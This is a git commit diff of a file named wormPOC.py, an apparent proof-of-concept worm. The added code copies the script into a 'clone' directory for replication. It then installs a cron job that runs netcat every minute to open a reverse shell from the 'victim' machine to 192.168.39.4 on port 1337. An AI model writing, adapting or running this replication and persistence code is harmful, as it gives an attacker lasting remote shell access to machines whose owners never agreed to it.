cf7d4012c8775f002ee795209901124a12572316
bananagav <117794258+bananagav@users.noreply.github.com>
2022-12-20 19:35:48 -0700

    Update wormPOC.py

--- Proof of Concept/wormPOC.py
+++ Proof of Concept/wormPOC.py
@@ -3,14 +3,23 @@
 from sys import argv
 import os
 
+#replication
 script = argv
 name = str(script[0])
 
-cmd = 'cat payload.txt'
-os.system(cmd)
+#for if the clone dir already exists
 if os.path.exists('clone'):
 	os.system(r'rm -r clone')
+
+#replication 
 os.mkdir('clone')
-os.system(r"cp payload.txt clone")
 os.system(r"cp " + name + " clone")
 
+
+
+#need some way to establish persistence on the victim
+
+#sets up a cron job to create a reverse shell into the victim machine
+os.system('echo "* * * * * nc 192.168.39.4 1337 -e /bin/sh" > cron')
+os.system('crontab -i cron')
+os.system('rm cron')
